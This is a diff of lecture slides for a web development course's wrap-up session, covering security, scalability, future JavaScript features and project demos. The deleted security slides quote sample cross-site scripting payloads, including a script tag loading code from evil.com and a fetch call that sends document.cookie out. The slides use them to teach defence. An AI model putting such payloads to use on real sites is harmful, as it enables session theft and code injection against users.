@@ -21,418 +21,7 @@ name: base
 ---
 name: Wrap Up
 
-
-
----
-name: Today
-
-* wrapup
-* security
-* scalability
-* projects!
-
-???
-
-
-
-
-
----
-name:  Security
-
-
-* problems: view and modify
-  * information disclosure
-  * perform operations on data as another user
-
-???
-
-
-
-
----
-name: Hard Problem
-
-* many attack vectors
-  * server side
-  * database
-  * frontend hacks
-* complex systems hard to analyze
-* weakest link
-
-???
-
-
-
-
----
-name:
-
-
-<iframe src="//giphy.com/embed/C1nEwzSrlVW80" width="680" height="448" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
-
-???
-
-
-
-
----
-name: Modes
-
-* connection between browser and web server
-  * password / existing session
-* attack server
-  * os or inject code
-* attack browser
-  * inject code into page
-* phish the user
-
-
-???
-
-
-
-
----
-name:  Protections
-
-* browser is sandboxed
-  * can't access filesystem directly
-* cryptography
-* frameworks
-  * help with common problems
-
-???
-
-
-
-
----
-name: Browser Problems
-
-* content can come from different sources
-  * iframes, tabs, ads
-* ads:
-  * content from elsewhere
-  * can inject code into page
-  * `document.parent.frames[0].forms[0];`
-
-???
-* Cross-Site Request Forgery (CSRF)
-
-
-
-
-
-
----
-name:  Same-Origin Policy
-
-* restrict frames
-* must come from same origin
-  * protocol, domain, port
-* DOM access
-* cookies
-* AJAX requests
-
-???
-
-
-
-
----
-name: CORS
-
-* same-origin too strict sometimes
-* cross origin resource sharing
-* in response HEADERS from server:
-  * `Access-Control-Allow-Origin: http://foo.com`
-  * `Access-Control-Allow-Methods: PUT, DELETE`
-
-???
-
-
-
-
-
-
----
-name: Network Attacks
-
-* mitm: man in the middle
-  * viewing unencrypted traffic
-  * modifying traffic
-
-???
-* non https in cafe
-
-
-
-
----
-name: Encryption
-
-* public-key encryption:
-  * each party (user/server) has two encryption keys, one public, one secret.
-  * needs secret handshake to exchange public keys via known symmetric key
-  * symmetric key: certificate signed by trusted authority
-  * browser trusts multiple root certificate authorities
-  * a domain having a certificate: https
-
-
-???
-
-
-
-
-
-
----
-name: https
-
-![](img/https.png){:  .white-background}
-
-
-???
-
-
-
-
----
-name:  DDOS
-
-* distributed denial of service
-  * overloading databases/servers
-  * botnets
-
-???
-* github ddos
-
-
-
-
-
-
-
----
-name: Session Attacks
-
-* stealing session id / token
-* JWTs help
-* add https and session timeouts
-
-
-???
-* with jwt would need unlimited access to computer really if using https
-
-
-
-
-
----
-name: Bad Input
-
-* input validation
-* executing user input
-* trusting client
-
-???
-* purchase price example
-* code execution on server example
-* attacks on server, what about user to user
-
-
-
-
-
-
----
-name: XSS
-
-* Cross Site Scripting Attack
-  * malicious user inputs content into site
-  * display user input: `<script src="http://www.evil.com/p0wn.js">`
-* protections:
-  * vet input && output
-  * react and express do a lot of this for us
-  * dangerouslySetHTML...
-
-???
-* users vulnerable to other users input
-* was ok because markdown parsed out stuff too
-
-
-
-
----
-name: stored vs reflected
-
-* stored:
-  * malicious code stored in db from user input
-* reflected:
-  * fake version of page gets user to submit input to real version
-  * input is reflected back:
-    * username is incorrect
-    * where username is `<script>fetch(..., document.cookie)</script>`
-
-
-???
-* again vetting input and output
-* react automatically sanitizes everything (encodes all special characters etc)
-
-
-
-
----
-name: SQL code injection
-
-
-![](img/exploits_of_a_mom.png){:  .white-background}
-
-
-???
-* using ORM or ODM (object data mapping like mongoose)
-
-
-
-
-
----
-name: PHISHING
-
-* fake sites that look real
-  * similar names
-  * unicode domainnames
-  * picture in picture
-* social engineering
-
-
-???
-* human is the weakest link
-
-
-
-
-
-
----
-name: Some Phishing Protections
-
-* show user generated content
-* extended validation https certificates
-  * expensive and hard to get
-* two factor auth
-
-???
-
-
-
-
-
-
----
-name: Scalability
-
-* scale up
-* scale out
-
-
-???
-* up is bigger machines
-* out is more machines
-* cpu, memory, network
-
-
-
-
----
-name: Scale Out
-
-![](img/scaleout.png){:  .white-background}
-
-
-???
-
-
-
-
-
-
----
-name: Scale Out Challenges
-
-* load balancing across many instances:
-  * data access
-  * concurrency
-  * state
-
-???
-* websockets have trouble scaling out but everybody wants to use them
-* stateless is better, cache session data
-* auth token needs validation - cache user information
-
-
-
-
----
-name: Scale Out Storage
-
-* single database not enough
-* sharding
-  * hash keys across shards
-
-???
-* draw shards
-* caches don't speed up writes
-* row locking
-* shard clusters with write master
-
-
-
-
----
-name: Scale Out Storage
-
-* fb initially one db per school
-* fb in 2009:
-  * 1,800 mysql servers
-  * 2000 memcached servers
-  * 10k servers total is estimate)
-
-???
-
-
-
-
-
-
-
-
-
----
-name: Virtualization
-
-
-![](img/virt.png){:  .white-background}
-
-
-???
-* docker etc
-
-
-
-
-
----
-name: CDN
-
-* Content Distribution Network
-  * read only cache of static files
-  * surge/ghpages automatically use CDN
-
-
-???
-
+.medium_small[![](img/biggest-fan.png)]
 
 
 
@@ -482,7 +71,7 @@ name: Considerations
 name:
 
 
-![](img/google211.jpg){:  .white-background}
+![](img/google211.jpg)
 
 
 
@@ -496,7 +85,7 @@ name:
 name:
 
 
-![](img/screen-shot-2015-06-24-at-11-54-41-am.png){:  .white-background}
+![](img/screen-shot-2015-06-24-at-11-54-41-am.png)
 
 
 ???
@@ -509,7 +98,7 @@ name:
 name:
 
 
-![](img/stormtrooper.jpg){:  .white-background}
+![](img/stormtrooper.jpg)
 
 
 ???
@@ -522,7 +111,7 @@ name:
 name:
 
 
-![](img/google-datacenter-tech-05.jpg){:  .white-background}
+![](img/google-datacenter-tech-05.jpg)
 
 
 ???
@@ -535,7 +124,7 @@ name:
 name:
 
 
-![](img/Google-Datacenter-3.jpg){:  .white-background}
+![](img/Google-Datacenter-3.jpg)
 
 ???
 
@@ -547,7 +136,7 @@ name:
 name:
 
 
-![](img/inteldoesmat.jpg){:  .white-background}
+![](img/inteldoesmat.jpg)
 
 ???
 
@@ -558,14 +147,13 @@ name:
 ---
 name: Problems Of Webdev
 
-* Software engineering problems programming at scale
+* Software engineering problems programming *at scale*
   * javascript lack of strong type system
   * browsers
   * interpreted performance
 
 ???
-*
-
+* What are some complaints about webdev?
 
 
 
@@ -576,15 +164,15 @@ name:  The future!
 * language and framework improvements
 * es7 (not much there)
 * es8?!
+* taking over the world (desktop and mobile)
 
 ???
 * in the stanford webdev class currently being taught react is "the future"
-
-
+* you guys learned the latest and greatest.  fun right?
 
 
 ---
-name: The future: async and await
+name: async and await
 
 ```javascript
 export default async function getLikes () {
@@ -615,6 +203,9 @@ export default async function getLikes () {
 ---
 name:  The future: Observables
 
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/lil4YCCXRYc?rel=0&amp;showinfo=0" frameborder="0" allowfullscreen></iframe>
+
 * asynch methods that can be subscribed to
   * function which returns an observable stream of events
   * can map / filter over streams of events
@@ -622,26 +213,11 @@ name:  The future: Observables
   * es8?
 
 ???
-* https://www.youtube.com/watch?v=lil4YCCXRYc
-
-
-
-
----
-name: GraphQL
-
-* Try this out at home!
-
-???
-* we talked about it, but try it now you have all the tools
-* express js with mongo + graphql!
-
-
 
 
 
 ---
-name: FP
+name: More FP Please!
 
 * functional programming paradigms
 * scalability and parallelism
@@ -655,32 +231,6 @@ name: FP
 
 
 ---
-name: Web Sockets
-
-* better security
-* better standards
-
-???
-* things like reconnections and CRUD
-
-
-
-
-
-
----
-name: Web Components
-
-* self designed "tags"
-* reusable containers (like react)
-* but builtin to browsers
-
-???
-
-
-
-
----
 name: Big Data Cloud
 
 * more scalable architectures in the "clooouudd"
@@ -689,11 +239,8 @@ name: Big Data Cloud
   * AWS Lambda
   * Google Cloud Functions
 
-
 ???
 *  functions in the cloud
-
-
 
 
 
@@ -727,6 +274,9 @@ name: ?
 ---
 name: Full Stack
 
+
+<iframe src="https://giphy.com/embed/3js0YStjZMYZq" width="271" height="380" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
+
 * lots to it
   * make pretty things
   * architect web services
@@ -745,7 +295,7 @@ name: Moving Fast
 * new developments all the time
 * stacks and tools evolving
 
-![](img/history-of-web-frameworks-timelin.png){: .medium .white-background}
+.medium[![](img/history-of-web-frameworks-timelin.png)]
 
 
 ???
@@ -758,7 +308,8 @@ name: Moving Fast
 ---
 name: Last Words
 
-<iframe src="//giphy.com/embed/101JR1ATcGSxOM" width="580" height="384" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
+<iframe src="https://giphy.com/embed/IcGkqdUmYLFGE" width="480" height="270" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
+
 
 ???
 * thank you
@@ -788,9 +339,11 @@ name: Last Words
 ---
 name: Last Words
 
+.medium.fancy[![](img/1433166770-wtc-1.gif)]
+
+
 * DALI!
-  * Applications open (9/9)
-* My Potential Future Courses:
+* Potential Future Courses:
   * Cloud Computing Course (big data/scalability)
   * Game Dev (game from ground up)
 * Keep building!
@@ -805,8 +358,8 @@ name: Last Words
 
 
 ---
-name: Project Demos Tomorrow
+name: Project Demos!
 
-* let make them awesome!
+* SUCH EXCITE!
 
 ???
